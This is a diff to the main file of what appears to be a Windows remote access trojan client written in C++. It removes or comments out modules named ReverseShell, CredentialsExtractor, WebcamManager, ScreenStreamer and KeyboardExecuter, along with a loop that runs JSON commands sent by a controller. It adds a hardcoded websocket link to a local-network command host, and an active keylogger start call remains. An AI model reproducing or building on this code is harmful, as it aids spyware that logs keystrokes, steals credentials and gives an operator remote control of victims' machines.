@@ -6,26 +6,13 @@
 #include <cstring>
 #include <random>
 #include "Stream.h"
-#include "Download.h"
-#include "FileManager.h"
-#include "ReverseShell.h"
-#include "KeyboardExecuter.h"
-#include "Permission.h"
-#include "MessageBoxGUI.h"
-#include "SystemState.h"
-#include "Install.h"
 #include "configuration.h"
-#include "ThreadGen.h"
-#include "WebcamManager.h"
-#include "ScreenStreamer.h"
-#include "json.hpp"
-#include "CredentialsExtractor.h"
-#include "ConnectionState.h"
-#include "Information.h"
+#include "ClientSocket.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
+
 
 std::vector<std::string> socket_conf_list = {"MAIN",
                                              "FILE_MANAGER",
@@ -100,7 +87,7 @@ void closeSockets(){
     }
 }
 
-
+typedef websocketpp::client<websocketpp::config::asio_client> client;
 int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
@@ -110,13 +97,15 @@ int main(int argc = 0, char *argv[] = nullptr) {
         keyLogger.tryStart();
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool isConnecting = true;
-
+        std::string uri = "ws://192.168.1.133:8080";
+        ClientSocket clientSocket(uri);
+        clientSocket.startConnection();
         bool streamListening = true;
         while (isConnecting) {
-            nlohmann::json jsonObject;
-            std::cout << "trying to connect " << std::endl;
-            if (generate_sockets()) {
-                Stream stream = *get_connection("FILE_MANAGER");
+
+
+           // if (generate_sockets()) {
+               /* Stream stream = *get_connection("FILE_MANAGER");
                 FileManager fileManager(stream, actionMap);
                 stream = *get_connection("DOWNLOAD_UPLOAD");
                 Download download(stream, actionMap);
@@ -135,29 +124,20 @@ int main(int argc = 0, char *argv[] = nullptr) {
                 stream = *get_connection("CREDENTIALS");
                 CredentialsExtractor credentialsExtractor(stream, actionMap);
                 stream = *get_connection("MAIN");
-                Information information(stream, actionMap);
-                MessageBoxGUI messageBoxGUI(stream, actionMap);
+
+                       MessageBoxGUI messageBoxGUI(stream, actionMap);
                 KeyboardExecuter keyboardExecuter(stream, actionMap);
                 ConnectionState connectionState(stream, actionMap, isConnecting, streamListening);
                 SystemState systemState(stream, actionMap);
                 stream.sendString("ACK");
-                while (streamListening) {
-                    jsonObject = nlohmann::json::parse(stream.readString());
-                    std::string action = jsonObject["ACTION"];
-                    std::cout << "Action: " << action << std::endl;
+                */
 
-                    auto it = actionMap.find(action);
-                    if (it != actionMap.end()) {
-                        it->second(jsonObject);
-                    } else {
-                        std::cout << "ACTION NOT FOUND :(" << std::endl;
-                    }
-                }
-                closeSockets();
-                WSACleanup();
+
+                //closeSockets();
+                //WSACleanup();
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
-        }
+       // }
     }
     ReleaseMutex(hMutexHandle);
     CloseHandle(hMutexHandle);
